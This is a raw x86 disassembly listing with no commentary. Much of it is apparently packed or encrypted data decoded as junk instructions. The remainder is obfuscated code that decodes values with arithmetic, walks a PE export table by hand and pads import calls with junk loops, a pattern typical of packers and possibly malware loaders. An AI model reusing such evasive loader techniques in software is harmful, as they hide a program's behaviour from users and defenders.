  40ffe2:	push   cs
  40ffe3:	jp     0x40ffc0
  40ffe5:	outs   dx,DWORD PTR ds:[esi]
  40ffe6:	repz mov eax,DWORD PTR [edi+0x4c]
  40ffea:	enter  0x9393,0x48
  40ffee:	xchg   ebx,eax
  40ffef:	add    DWORD PTR [edx+0x2],esp
  40fff2:	test   al,0x45
  40fff4:	adc    BYTE PTR [ecx],ch
  40fff6:	xor    eax,0x9fb1be5e
  40fffb:	inc    eax
  40fffc:	sub    al,0x43
  40fffe:	dec    ebp
  40ffff:	ret    0xced1
  410002:	mov    bl,0x4b
  410004:	sti    
  410005:	pop    DWORD PTR [edi+0x45d809e1]
  41000b:	enter  0x5b23,0xa6
  41000f:	sbb    edx,ecx
  410011:	jnp    0x40ffde
  410013:	es cdq 
  410015:	cwde   
  410016:	ins    BYTE PTR es:[edi],dx
  410017:	adc    eax,0x7a637ed5
  41001c:	mov    WORD PTR [edi+0x8],gs
  41001f:	pop    es
  410020:	cmp    DWORD PTR [eax+edx*2+0x58],ecx
  410024:	sbb    ebp,DWORD PTR [eax+0x25e1bab1]
  41002a:	and    al,0x83
  41002c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41002d:	scas   al,BYTE PTR es:[edi]
  41002e:	xchg   edi,eax
  41002f:	mov    ebp,0x221be07e
  410034:	xor    BYTE PTR [eax+0x4785f1dd],cl
  41003a:	loop   0x410070
  41003c:	push   ecx
  41003d:	adc    al,0x46
  41003f:	push   eax
  410040:	cwde   
  410041:	outs   dx,BYTE PTR ds:[esi]
  410042:	stos   DWORD PTR es:[edi],eax
  410043:	sbb    al,0x85
  410045:	mov    edi,0xbe5a4228
  41004a:	dec    esp
  41004b:	xor    dh,BYTE PTR [esi-0x5f15b62d]
  410051:	enter  0xa817,0x34
  410055:	jne    0x410022
  410057:	loope  0x410021
  410059:	pop    edx
  41005a:	jle    0x410060
  41005c:	out    dx,eax
  41005d:	repz cmp DWORD PTR es:[eax-0x63],esp
  410062:	fsub   DWORD PTR [ebp+0x9a899e]
  410068:	ins    BYTE PTR es:[edi],dx
  410069:	sbb    BYTE PTR [eax],ah
  41006b:	inc    esp
  41006c:	mov    ebx,0x48445667
  410071:	retf   
  410072:	push   0x9cc1a0f1
  410077:	adc    eax,0x8a0af0f5
  41007c:	lock adc BYTE PTR cs:[si-0x7a],bh
  410082:	fdivrp st(0),st
  410084:	ficom  WORD PTR [edi+0x5eca29d6]
  41008a:	jb     0x410077
  41008c:	mov    cl,0x96
  41008e:	jl     0x4100df
  410090:	add    DWORD PTR [ecx+ebx*4-0x88b9cc],edx
  410097:	mov    eax,ds:0xf8db97e1
  41009c:	imul   ebp,DWORD PTR [ebx+ecx*1],0xe47e202f
  4100a3:	dec    ebx
  4100a4:	xchg   ecx,eax
  4100a5:	out    0xa2,al
  4100a7:	mov    ?,ecx
  4100a9:	pop    ss
  4100aa:	add    BYTE PTR [ebx-0x2f],0x41
  4100ae:	mov    bh,0xd5
  4100b0:	js     0x4100ea
  4100b2:	clc    
  4100b3:	and    DWORD PTR [edx+ebp*4-0x38],ecx
  4100b7:	and    eax,0x3982faeb
  4100bc:	mov    esi,esi
  4100be:	xchg   esp,eax
  4100bf:	sbb    al,0x6e
  4100c1:	mov    al,ds:0x524f0350
  4100c6:	and    bh,BYTE PTR [ebp-0x32]
  4100c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100ca:	cmp    eax,0x7a532b4e
  4100cf:	dec    edx
  4100d0:	icebp  
  4100d1:	sbb    eax,0x851c3021
  4100d6:	out    dx,eax
  4100d7:	push   ebx
  4100d8:	cmp    dh,dl
  4100da:	mov    al,ds:0x71d62165
  4100df:	dec    eax
  4100e0:	into   
  4100e1:	adc    DWORD PTR [ecx+eax*8],ebp
  4100e4:	loopne 0x41015e
  4100e6:	sbb    al,0xd6
  4100e8:	xchg   esp,eax
  4100e9:	mov    esi,ebp
  4100eb:	jo     0x41011b
  4100ed:	xor    al,0xb0
  4100ef:	cmp    bl,BYTE PTR [ecx+0x4f]
  4100f2:	nop
  4100f3:	loop   0x4100f5
  4100f5:	retf   0x8788
  4100f8:	sti    
  4100f9:	js     0x4100da
  4100fb:	dec    ecx
  4100fc:	mov    DWORD PTR [edi-0x54],edx
  4100ff:	mov    DWORD PTR [ecx],ebp
  410101:	call   0xb6e0:0x7386ae13
  410108:	jge    0x410118
  41010a:	popf   
  41010b:	pop    edi
  41010c:	sti    
  41010d:	and    BYTE PTR [esi],dl
  41010f:	fcom   QWORD PTR [ebx-0x3b]
  410112:	ret    0x9015
  410115:	ds jb  0x4100a0
  410118:	xor    al,0xe4
  41011a:	(bad)  
  41011b:	std    
  41011c:	mov    bl,al
  41011e:	fcmovnb st,st(1)
  410120:	mov    ah,0xb3
  410122:	(bad)  
  410123:	int3   
  410124:	loope  0x41018e
  410126:	sub    al,0xb1
  410128:	xor    DWORD PTR [esi-0xf42ff32],edi
  41012e:	clc    
  41012f:	std    
  410130:	adc    al,0x2f
  410132:	out    0x88,eax
  410134:	lahf   
  410135:	and    eax,0x5acd8a77
  41013a:	std    
  41013b:	sub    al,0x99
  41013d:	call   FWORD PTR [edx-0x462002da]
  410143:	pop    eax
  410144:	cmp    esp,DWORD PTR [edx+0x4a]
  410147:	hlt    
  410148:	and    eax,0x60e18270
  41014d:	or     DWORD PTR [eax],eax
  41014f:	or     eax,0x6e761161
  410154:	cli    
  410155:	div    BYTE PTR [ebx+0x45]
  410158:	test   BYTE PTR [edx-0x75],dh
  41015b:	pop    ss
  41015c:	fs cmp bh,bl
  41015f:	mov    ebx,0xb9af918c
  410164:	imul   edi,DWORD PTR [edi],0x445f997b
  41016a:	imul   ebp,DWORD PTR [ebx],0x1b
  41016d:	stc    
  41016e:	or     edi,DWORD PTR [edi-0x48]
  410171:	daa    
  410172:	mov    esp,0x2c54e7a8
  410177:	call   0x3d04d5aa
  41017c:	sbb    BYTE PTR [esi-0xf0daca3],dl
  410182:	dec    esi
  410183:	jmp    0xa4a4:0x8681de07
  41018a:	ss xchg ax,ax
  41018d:	(bad)  
  41018e:	cmc    
  41018f:	mov    cl,0x27
  410191:	ja     0x4101b8
  410193:	sub    al,0xca
  410195:	cld    
  410196:	cmp    al,0xf3
  410198:	mov    ebx,0xfd8d8711
  41019d:	jnp    0x4101d7
  41019f:	cli    
  4101a0:	add    cl,BYTE PTR [eax+esi*1-0x31]
  4101a4:	scas   al,BYTE PTR es:[edi]
  4101a5:	pop    ebx
  4101a6:	shl    DWORD PTR [edx],0x7a
  4101a9:	test   BYTE PTR [edx],bh
  4101ab:	and    eax,0xb69575ef
  4101b0:	xor    eax,0x1cd390c1
  4101b5:	imul   ebp,DWORD PTR [edi],0x9609aa9c
  4101bb:	jae    0x410145
  4101bd:	jg     0x410200
  4101bf:	cs out dx,eax
  4101c1:	addr16 jg 0x410210
  4101c4:	mov    eax,0xc6ead85d
  4101c9:	jg     0x4101b2
  4101cb:	inc    ecx
  4101cc:	lds    edx,FWORD PTR [ecx]
  4101ce:	cmp    BYTE PTR [eax-0x2],0xb3
  4101d2:	sbb    ebp,edi
  4101d4:	and    al,0x61
  4101d6:	adc    al,0xe9
  4101d8:	or     ebx,DWORD PTR ds:[edx-0x5]
  4101dc:	das    
  4101dd:	shl    DWORD PTR [esi-0x78d62e1e],0xe9
  4101e4:	cmp    BYTE PTR [ebp+0x2aa9e455],al
  4101ea:	jns    0x410260
  4101ec:	xor    BYTE PTR [edx+0x72],ah
  4101ef:	push   eax
  4101f0:	rcl    BYTE PTR [ecx+0x31],1
  4101f3:	lahf   
  4101f4:	popf   
  4101f5:	mov    dl,BYTE PTR es:[eax-0x69]
  4101f9:	(bad)  
  4101fa:	imul   eax,ebp,0xeabd3056
  410200:	xchg   ebp,eax
  410201:	jns    0x41025f
  410203:	mov    cl,0x7e
  410205:	test   BYTE PTR [ecx-0x570af219],cl
  41020b:	jecxz  0x4101e5
  41020d:	mov    dh,0x93
  41020f:	sub    bh,BYTE PTR [ecx]
  410211:	mov    esp,0xb53b5643
  410216:	xchg   BYTE PTR [edi-0x5fe73863],ah
  41021c:	jo     0x7f9f9196
  410222:	cdq    
  410223:	sub    BYTE PTR [eax-0x447152dc],al
  410229:	call   0x7477:0x2c6aee5a
  410230:	cmp    cl,BYTE PTR [ebx-0x70ccc30e]
  410236:	hlt    
  410237:	sbb    bl,bh
  410239:	call   0x45c7:0x49ef7b99
  410240:	mov    ebx,0xf799cf1
  410245:	or     al,0x52
  410247:	xchg   ebp,eax
  410248:	ret    0xfed1
  41024b:	sar    BYTE PTR [edi-0x2489b001],cl
  410251:	xlat   BYTE PTR ds:[ebx]
  410252:	mov    eax,ds:0xbbbe4cc5
  410257:	mov    bl,0xe7
  410259:	sbb    BYTE PTR [esi],ch
  41025b:	jge    0x410272
  41025d:	enter  0xf151,0x45
  410261:	cmc    
  410262:	leave  
  410263:	retf   
  410264:	push   eax
  410265:	rcr    bh,1
  410267:	pusha  
  410268:	inc    ecx
  410269:	cmp    eax,0x12d92d9a
  41026e:	add    bl,al
  410270:	xor    edx,0xffffffd2
  410273:	(bad)  
  410274:	aad    0x97
  410276:	push   es
  410277:	rcr    DWORD PTR [ebp-0x3af1b9e1],0x4f
  41027e:	(bad)  
  41027f:	mov    bh,BYTE PTR [ebp-0x4e]
  410282:	xor    eax,0xe3b2f1aa
  410287:	ja     0x41023d
  410289:	in     eax,dx
  41028a:	mov    ds:0xc882fd13,al
  41028f:	sti    
  410290:	sbb    DWORD PTR [edx+ecx*2+0x792eda0],edx
  410297:	dec    edi
  410298:	cmp    BYTE PTR [eax],0x9c
  41029b:	lea    edx,[esi+edx*2]
  41029e:	sbb    esi,DWORD PTR [ecx-0x5]
  4102a1:	mov    dl,0x2
  4102a3:	bound  ebx,QWORD PTR [ecx]
  4102a5:	mov    ds:0xb4b69857,al
  4102aa:	scas   eax,DWORD PTR es:[edi]
  4102ab:	enter  0xe5bc,0xe
  4102af:	inc    esp
  4102b0:	fistp  QWORD PTR [edi-0x5086af10]
  4102b6:	pop    esi
  4102b7:	xchg   ecx,eax
  4102b8:	pop    es
  4102b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102ba:	pop    ss
  4102bb:	lods   al,BYTE PTR ds:[esi]
  4102bc:	mov    esi,0x148af19d
  4102c1:	mov    DWORD PTR [esi+0x630e409],esp
  4102c7:	out    0x9f,al
  4102c9:	xchg   ebx,eax
  4102ca:	dec    ecx
  4102cb:	retf   0x181c
  4102ce:	aaa    
  4102cf:	sub    DWORD PTR [eax-0x6b99d0f2],ebp
  4102d5:	and    al,0xf
  4102d7:	xchg   edi,eax
  4102d8:	mov    DWORD PTR [ecx+0x454a724a],edi
  4102de:	ja     0x410275
  4102e0:	jno    0x41035b
  4102e2:	lods   al,BYTE PTR ds:[esi]
  4102e3:	push   ebx
  4102e4:	les    edi,FWORD PTR [ecx+0x3f]
  4102e7:	jg     0x410295
  4102e9:	pop    edi
  4102ea:	imul   edx,DWORD PTR [edi],0x67f85a38
  4102f0:	in     al,0xad
  4102f2:	cdq    
  4102f3:	adc    eax,0x4384ee3f
  4102f8:	stos   BYTE PTR es:[edi],al
  4102f9:	mov    dh,0xb
  4102fb:	and    al,0xf9
  4102fd:	lock inc eax
  4102ff:	dec    ebp
  410300:	(bad)
  410303:	or     al,BYTE PTR ds:0x4ca7be20
  410309:	fwait
  41030a:	pmulhuw mm2,QWORD PTR [ebp+0x16a28ba0]
  410311:	mov    al,ds:0xe0a30c8a
  410316:	rcr    BYTE PTR [ebp+0x73760f42],1
  41031c:	not    al
  41031e:	xchg   ecx,eax
  41031f:	int    0xe3
  410321:	imul   esp,eax,0xffffff90
  410324:	or     DWORD PTR [edi+ecx*4+0x60def6be],edi
  41032b:	xor    cl,BYTE PTR [ebx+ebx*1+0x1e]
  41032f:	jb     0x410347
  410331:	mov    al,0xa9
  410333:	cdq    
  410334:	mov    esi,0x49ea74e1
  410339:	mov    dh,0xe6
  41033b:	jnp    0x4103ac
  41033d:	jp     0x410392
  41033f:	pop    eax
  410340:	test   DWORD PTR [ecx],ecx
  410342:	sbb    eax,0xcf1cc308
  410347:	mov    dl,0xd8
  410349:	pop    esp
  41034a:	xchg   DWORD PTR [edi],ebp
  41034c:	repnz dec ebp
  41034e:	popa   
  41034f:	push   edi
  410350:	(bad)  
  410351:	jb     0x4103b2
  410353:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410354:	add    ebx,esi
  410356:	lds    edx,FWORD PTR [ebx+0x78]
  410359:	xor    BYTE PTR [eax-0x72c641df],0xa3
  410360:	nop
  410361:	loop   0x41038b
  410363:	stc    
  410364:	lds    edi,FWORD PTR [eiz*4-0x1f25e1cc]
  41036b:	cmp    ebx,esp
  41036d:	mov    ebx,0x3b4b
  410372:	sub    di,bx
  410375:	mov    ebx,0x8a85
  41037a:	xor    di,bx
  41037d:	mov    ebx,0x4f8a
  410382:	cmp    di,bx
  410385:	jne    0x4103ad
  41038b:	movsx  di,BYTE PTR [eax]
  41038f:	mov    ebx,0x3b4b
  410394:	sub    di,bx
  410397:	mov    ebx,0x8a85
  41039c:	xor    di,bx
  41039f:	mov    ebx,0x4f87
  4103a4:	cmp    di,bx
  4103a7:	je     0x4103bd
  4103ad:	mov    edi,DWORD PTR [ebp-0x10]
  4103b0:	xor    edi,ecx
  4103b2:	mov    ebx,esi
  4103b4:	sub    ebx,edi
  4103b6:	add    eax,ebx
  4103b8:	jmp    0x40dfbd
  4103bd:	mov    esi,DWORD PTR [ebp-0x14]
  4103c0:	mov    esi,DWORD PTR [esi]
  4103c2:	mov    edi,DWORD PTR [eax+0x3c]
  4103c5:	lea    esi,[edi+esi*8+0x78]
  4103c9:	mov    esi,DWORD PTR [esi+eax*1]
  4103cc:	mov    DWORD PTR [ebp-0x8],esi
  4103cf:	mov    esi,DWORD PTR [ebp+0x8]
  4103d2:	xor    esi,ecx
  4103d4:	add    esi,edx
  4103d6:	mov    DWORD PTR [ebp-0x14],esi
  4103d9:	mov    esi,DWORD PTR [ebp+0x8]
  4103dc:	mov    edi,DWORD PTR [ebp-0x8]
  4103df:	xor    esi,ecx
  4103e1:	add    esi,edx
  4103e3:	pop    ebx
  4103e4:	cmp    edi,esi
  4103e6:	jne    0x410404
  4103ec:	mov    eax,DWORD PTR [ebp+0xc]
  4103ef:	xor    eax,ecx
  4103f1:	mov    ecx,DWORD PTR [ebp-0x8]
  4103f4:	add    eax,edx
  4103f6:	imul   eax,ecx
  4103f9:	mov    DWORD PTR [ebp-0x8],eax
  4103fc:	push   DWORD PTR [ebp+0x18]
  4103ff:	jmp    0x410458
  410404:	mov    ecx,DWORD PTR [ebp-0x8]
  410407:	add    ecx,eax
  410409:	mov    DWORD PTR [ebp-0x14],ecx
  41040c:	mov    ecx,DWORD PTR [ebp-0x14]
  41040f:	mov    ecx,DWORD PTR [ecx+0xc]
  410412:	movsx  cx,BYTE PTR [ecx+eax*1]
  410417:	mov    edx,0x3b4b
  41041c:	sub    cx,dx
  41041f:	mov    edx,0x8a85
  410424:	xor    cx,dx
  410427:	mov    edx,0x4f85
  41042c:	cmp    cx,dx
  41042f:	jne    0x4103fc
  410435:	mov    ecx,DWORD PTR ds:0x41d3dc
  41043b:	mov    ecx,DWORD PTR [ecx+0x198]
  410441:	mov    DWORD PTR [ecx],eax
  410443:	jmp    0x410469
  410448:	mov    ecx,DWORD PTR [ebp+0x18]
  41044b:	cmp    ecx,0xf89c85b5
  410451:	jne    0x410469
  410457:	push   eax
  410458:	push   DWORD PTR [ebp+0x14]
  41045b:	push   DWORD PTR [ebp+0x10]
  41045e:	push   DWORD PTR [ebp+0xc]
  410461:	push   DWORD PTR [ebp+0x8]
  410464:	call   0x40b7a6
  410469:	pop    edi
  41046a:	pop    esi
  41046b:	leave  
  41046c:	ret    0x14
  41046f:	push   ebp
  410470:	mov    ebp,esp
  410472:	sub    esp,0x48
  410475:	and    DWORD PTR ds:0x427018,0x0
  41047f:	mov    eax,ds:0x427018
  410484:	inc    eax
  410485:	mov    ds:0x427018,eax
  41048a:	cmp    DWORD PTR ds:0x427018,0xc
  410491:	jne    0x4104a6
  410497:	push   DWORD PTR [ebp-0xc]
  41049a:	push   DWORD PTR [ebp-0xc]
  41049d:	push   DWORD PTR [ebp-0x28]
  4104a0:	call   DWORD PTR ds:0x421028
  4104a6:	cmp    DWORD PTR ds:0x427018,0xb
  4104ad:	jne    0x4104be
  4104b3:	mov    eax,ds:0x427018
  4104b8:	inc    eax
  4104b9:	mov    ds:0x427018,eax
  4104be:	cmp    DWORD PTR ds:0x427018,0x1f
  4104c5:	jb     0x41047f
  4104cb:	adc    DWORD PTR ds:0x428010,ebx
  4104d1:	push   ebx
  4104d2:	mov    DWORD PTR ds:0x426010,0x1e
  4104dc:	cmp    DWORD PTR ds:0x426010,0x0
  4104e3:	je     0x410526
  4104e9:	cmp    DWORD PTR ds:0x426010,0x26
  4104f0:	jne    0x410501
  4104f6:	push   0x41ff82
  4104fb:	call   DWORD PTR ds:0x42102c
  410501:	xor    eax,eax
  410503:	xor    eax,DWORD PTR ds:0x426010
  410509:	dec    eax
  41050a:	mov    ds:0x426010,eax
  41050f:	jmp    0x4104dc
  410514:	movzx  eax,WORD PTR ds:0x427014
  41051b:	sub    eax,DWORD PTR ds:0x426004
  410521:	mov    ds:0x427014,eax
  410526:	push   esi
  410527:	push   edi
  410528:	and    DWORD PTR ds:0x428000,0x0
  410532:	jmp    0x410544
  410537:	mov    edi,DWORD PTR ds:0x428000
  41053d:	inc    edi
  41053e:	mov    DWORD PTR ds:0x428000,edi
  410544:	cmp    DWORD PTR ds:0x428000,0x1e
  41054b:	jae    0x410597
  410551:	cmp    DWORD PTR ds:0x428000,0x1f
  410558:	jne    0x41058c
  41055e:	push   DWORD PTR [ebp-0x28]
  410561:	push   0x3d00
  410566:	push   0x5480
  41056b:	push   DWORD PTR [ebp-0x10]
  41056e:	push   DWORD PTR [ebp-0x24]
  410571:	push   DWORD PTR [ebp-0x1c]
  410574:	push   0x6187
  410579:	push   DWORD PTR [ebp-0x20]
  41057c:	push   0x5fd8
  410581:	push   0x12ef
  410586:	call   DWORD PTR ds:0x421030
  41058c:	jmp    0x410537
  410591:	and    eax,DWORD PTR ds:0x426018
  410597:	xor    esi,esi
  410599:	and    DWORD PTR ds:0x428008,0x0
  4105a3:	jmp    0x4105b5
  4105a8:	mov    edi,DWORD PTR ds:0x428008
  4105ae:	inc    edi
  4105af:	mov    DWORD PTR ds:0x428008,edi
  4105b5:	cmp    DWORD PTR ds:0x428008,0x1e
  4105bc:	jae    0x4105ff
  4105c2:	cmp    DWORD PTR ds:0x428008,0xe
  4105c9:	jne    0x4105e0
  4105cf:	push   DWORD PTR [ebp-0x18]
  4105d2:	push   0x425020
  4105d7:	push   DWORD PTR [ebp-0x28]
  4105da:	call   DWORD PTR ds:0x421034
  4105e0:	cmp    DWORD PTR ds:0x428008,0xd
  4105e7:	jne    0x4105fa
  4105ed:	mov    edi,DWORD PTR ds:0x428008
  4105f3:	inc    edi
  4105f4:	mov    DWORD PTR ds:0x428008,edi
  4105fa:	jmp    0x4105a8
  4105ff:	mov    DWORD PTR [ebp-0x20],esi
  410602:	or     eax,edi
  410604:	mov    eax,DWORD PTR [ebp-0xc]
  410607:	push   0x21
  410609:	and    DWORD PTR ds:0x429004,edi
  41060f:	mov    DWORD PTR [ebp-0xc],eax
  410612:	add    edi,DWORD PTR ds:0x425020
  410618:	pop    edi
  410619:	add    DWORD PTR ds:0x425010,0x428010
  410623:	push   0x41d4f0
  410628:	call   DWORD PTR ds:0x421040
  41062e:	push   esi
  41062f:	and    DWORD PTR ds:0x425008,0x428018
  410639:	push   0x2
  41063b:	adc    DWORD PTR ds:0x425018,0x428008
  410645:	push   0x1
  410647:	xor    DWORD PTR ds:0x429004,0x425020
  410651:	push   0x2
  410653:	push   0x1
  410655:	add    DWORD PTR ds:0x42800c,0x158b
  41065f:	push   0x8678768
  410664:	push   0x87676776
  410669:	call   DWORD PTR ds:0x42100c
  41066f:	xor    DWORD PTR ds:0x427014,0x429004
  410679:	push   esi
  41067a:	add    DWORD PTR ds:0x42601c,0x4e21
  410684:	push   0x68
  410686:	and    DWORD PTR ds:0x425024,0x9b5
  410690:	push   0xd
  410692:	not    DWORD PTR ds:0x42501c
  410698:	push   0x5
  41069a:	or     DWORD PTR ds:0x425020,0x429010
  4106a4:	push   0x3
  4106a6:	push   0x5468787
  4106ab:	call   DWORD PTR ds:0x421024
  4106b1:	dec    edi
  4106b2:	mov    DWORD PTR ds:0x425010,0x709e
  4106bc:	jne    0x410619
  4106c2:	mov    eax,DWORD PTR [ebp-0xc]
  4106c5:	mov    DWORD PTR ds:0x425000,edi
  4106cb:	mov    ebx,0xf89c85b6
  4106d0:	cmp    eax,ebx
  4106d2:	mov    DWORD PTR ds:0x426014,0x6187
  4106dc:	jne    0x4107d8
  4106e2:	or     DWORD PTR ds:0x426008,0x425010
  4106ec:	mov    DWORD PTR ds:0x41d4ec,0xf89c85b5
  4106f6:	add    DWORD PTR ds:0x428014,0x8c5
  410700:	push   DWORD PTR [ebp+0x10]
  410703:	sbb    DWORD PTR ds:0x426004,0x426010
  41070d:	push   DWORD PTR [ebp+0xc]
  410710:	push   DWORD PTR [ebp+0x8]
  410713:	call   0x403cbf
  410718:	mov    DWORD PTR ds:0x426018,0x1f
  410722:	cmp    DWORD PTR ds:0x426018,0x0
  410729:	je     0x4107c2
  41072f:	cmp    DWORD PTR ds:0x426018,0xf
  410736:	jne    0x41074a
  41073c:	push   DWORD PTR [ebp-0x14]
  41073f:	push   0x348e
  410744:	call   DWORD PTR ds:0x421038
  41074a:	cmp    DWORD PTR ds:0x426018,0x10
  410751:	jne    0x410764
  410757:	mov    edi,DWORD PTR ds:0x426018
  41075d:	dec    edi
  41075e:	mov    DWORD PTR ds:0x426018,edi
  410764:	mov    edi,DWORD PTR ds:0x426018
  41076a:	dec    edi
  41076b:	mov    DWORD PTR ds:0x426018,edi
  410771:	jmp    0x410722
  410776:	and    DWORD PTR ds:0x429004,0x0
  410780:	mov    esi,DWORD PTR ds:0x429004
  410786:	inc    esi
  410787:	mov    DWORD PTR ds:0x429004,esi
  41078d:	cmp    DWORD PTR ds:0x429004,0x1f
  410794:	jne    0x4107b5
  41079a:	push   0x55b4
  41079f:	push   DWORD PTR [ebp-0x14]
  4107a2:	push   0x42600c
  4107a7:	push   0x45b8
  4107ac:	push   DWORD PTR [ebp-0x28]
  4107af:	call   DWORD PTR ds:0x421000
  4107b5:	cmp    DWORD PTR ds:0x429004,0x16
  4107bc:	jb     0x410780
  4107c2:	mov    ecx,DWORD PTR ds:0x41d3dc
  4107c8:	sub    esi,edi
  4107ca:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4107d0:	and    edi,0x3fae
  4107d6:	mov    DWORD PTR [ecx],eax
  4107d8:	or     edi,DWORD PTR ds:0x425010
  4107de:	mov    DWORD PTR [ebp-0x4],ebx
  4107e1:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4107e8:	lea    eax,[ebp-0x28]
  4107eb:	xor    DWORD PTR ds:0x425018,edx
  4107f1:	mov    DWORD PTR [ebp-0x20],eax
  4107f4:	sbb    edi,DWORD PTR ds:0x429010
  4107fa:	lea    eax,[ebp-0x2c]
  4107fd:	and    DWORD PTR ds:0x427014,0x0
  410807:	mov    edi,DWORD PTR ds:0x427014
  41080d:	inc    edi
  41080e:	mov    DWORD PTR ds:0x427014,edi
  410814:	cmp    DWORD PTR ds:0x427014,0x1d
  41081b:	jne    0x41082c
  410821:	push   0x45e3
  410826:	call   DWORD PTR ds:0x421004
  41082c:	cmp    DWORD PTR ds:0x427014,0x1c
  410833:	jb     0x410807
  410839:	sbb    DWORD PTR ds:0x42501c,edx
  41083f:	mov    DWORD PTR [ebp-0x1c],eax
  410842:	and    DWORD PTR ds:0x428010,0x0
  41084c:	mov    edi,DWORD PTR ds:0x428010
  410852:	inc    edi
  410853:	mov    DWORD PTR ds:0x428010,edi
  410859:	cmp    DWORD PTR ds:0x428010,0xd
  410860:	jne    0x410874
  410866:	push   0x41ffb1
  41086b:	push   DWORD PTR [ebp-0xc]
  41086e:	call   DWORD PTR ds:0x421008
  410874:	cmp    DWORD PTR ds:0x428010,0xc
  41087b:	jne    0x41088e
  410881:	mov    edi,DWORD PTR ds:0x428010
  410887:	inc    edi
  410888:	mov    DWORD PTR ds:0x428010,edi
  41088e:	cmp    DWORD PTR ds:0x428010,0x1b
  410895:	jb     0x41084c
  41089b:	and    edi,esi
  41089d:	mov    eax,ds:0x41d3dc
  4108a2:	sub    ecx,esi
  4108a4:	mov    eax,DWORD PTR [eax+0x1c8]
  4108aa:	mov    eax,DWORD PTR [eax]
  4108ac:	mov    ecx,DWORD PTR [ebp-0x1c]
  4108af:	not    edi
  4108b1:	mov    esi,0x7510893
  4108b6:	xor    eax,esi
  4108b8:	movzx  edi,BYTE PTR ds:0x425028
  4108bf:	add    DWORD PTR ds:0x427018,edi
  4108c5:	mov    edi,0x3272db
  4108ca:	adc    DWORD PTR ds:0x42601c,0x425018
  4108d4:	add    eax,edi
  4108d6:	mov    DWORD PTR ds:0x425000,0x302d
  4108e0:	mov    DWORD PTR [ecx],eax
  4108e2:	mov    DWORD PTR ds:0x429010,ebx
  4108e8:	mov    eax,ds:0x41d5d8
  4108ed:	mov    DWORD PTR ds:0x427008,0x286e
  4108f7:	cmp    eax,0x301ac8f5
  4108fc:	jne    0x41095e
  410902:	and    DWORD PTR ds:0x427000,0x0
  41090c:	xor    eax,eax
  41090e:	or     eax,DWORD PTR ds:0x427000
  410914:	inc    eax
  410915:	mov    ds:0x427000,eax
  41091a:	cmp    DWORD PTR ds:0x427000,0x19
  410921:	jne    0x410930
  410927:	push   DWORD PTR [ebp-0x28]
  41092a:	call   DWORD PTR ds:0x421048
  410930:	cmp    DWORD PTR ds:0x427000,0x17
  410937:	jb     0x41090c
  41093d:	mov    eax,DWORD PTR [ebp-0x4]
  410940:	mov    ecx,DWORD PTR ds:0x41d3dc
  410946:	mov    ecx,DWORD PTR [ecx+0x198]
  41094c:	xor    eax,esi
  41094e:	add    eax,edi
  410950:	mov    DWORD PTR [ecx],eax
  410952:	mov    eax,DWORD PTR [ebp-0x4]
  410955:	xor    eax,esi
  410957:	add    eax,edi
  410959:	mov    ds:0x41d5d8,eax
  41095e:	mov    eax,ds:0x41d3dc
  410963:	mov    eax,DWORD PTR [eax+0x18c]
  410969:	mov    eax,DWORD PTR [eax]
  41096b:	mov    DWORD PTR [ebp-0x30],eax
  41096e:	mov    eax,0xf89c85ba
  410973:	mov    DWORD PTR [ebp-0x1c],eax
  410976:	mov    DWORD PTR [ebp-0x1c],eax
  410979:	mov    DWORD PTR [ebp-0x1c],eax
  41097c:	mov    DWORD PTR [ebp-0x1c],ebx
  41097f:	mov    DWORD PTR [ebp-0x38],eax
  410982:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  410989:	mov    ebx,DWORD PTR [ebp-0x4]
  41098c:	mov    ecx,DWORD PTR [ebp-0x8]
  41098f:	mov    edx,DWORD PTR [ebp-0x8]
  410992:	xor    edx,esi
  410994:	xor    ecx,esi
  410996:	add    ecx,edx
  410998:	mov    edx,DWORD PTR [ebp-0x8]
  41099b:	xor    ebx,esi
  41099d:	xor    edx,esi
  41099f:	add    ebx,edi
  4109a1:	lea    ecx,[ecx+edx*1+0x975891]
  4109a8:	cmp    ebx,ecx
  4109aa:	ja     0x410a0b
  4109b0:	mov    eax,DWORD PTR [ebp-0x8]
  4109b3:	xor    eax,esi
  4109b5:	lea    eax,[eax+ebx*1+0x3272db]
  4109bc:	push   eax
  4109bd:	mov    eax,DWORD PTR [ebp-0x1c]
  4109c0:	xor    eax,esi
  4109c2:	lea    eax,[ebp+eax*1+0x3272e3]
  4109c9:	push   eax
  4109ca:	mov    eax,ds:0x41d3dc
  4109cf:	push   DWORD PTR [eax+0x1bc]
  4109d5:	call   0x403ce8
  4109da:	mov    eax,DWORD PTR [ebp-0x8]
  4109dd:	xor    eax,esi
  4109df:	lea    ebx,[ebx+eax*1+0x3272db]
  4109e6:	mov    eax,DWORD PTR [ebp-0x8]
  4109e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4109ec:	xor    ecx,esi
  4109ee:	xor    eax,esi
  4109f0:	add    eax,ecx
  4109f2:	mov    ecx,DWORD PTR [ebp-0x8]
  4109f5:	xor    ecx,esi
  4109f7:	lea    eax,[eax+ecx*1+0x975891]
  4109fe:	cmp    ebx,eax
  410a00:	jbe    0x4109b0
  410a06:	mov    eax,0xf89c85ba
  410a0b:	mov    ecx,DWORD PTR [ebp+0xc]
  410a0e:	mov    DWORD PTR ds:0x41d260,ecx
  410a14:	mov    ecx,DWORD PTR [ebp+0x10]
  410a17:	mov    DWORD PTR ds:0x41d4b4,ecx
  410a1d:	mov    ecx,DWORD PTR ds:0x41d260
  410a23:	mov    edx,DWORD PTR [ebp-0x20]
  410a26:	sub    ecx,edi
  410a28:	xor    ecx,esi
  410a2a:	mov    DWORD PTR [edx],ecx
  410a2c:	mov    edx,DWORD PTR [ebp-0xc]
  410a2f:	mov    ecx,0xf89c85b6
  410a34:	cmp    edx,ecx
  410a36:	jne    0x410a61
  410a3c:	lea    eax,[ebp-0x14]
  410a3f:	mov    DWORD PTR [ebp-0x24],eax
  410a42:	lea    eax,[ebp+0x4]
  410a45:	mov    DWORD PTR [ebp-0x14],eax
  410a48:	mov    eax,DWORD PTR [ebp-0x14]
  410a4b:	test   eax,eax
  410a4d:	je     0x410b76
  410a53:	mov    eax,DWORD PTR [ebp-0x10]
  410a56:	mov    eax,DWORD PTR [ebp-0x8]
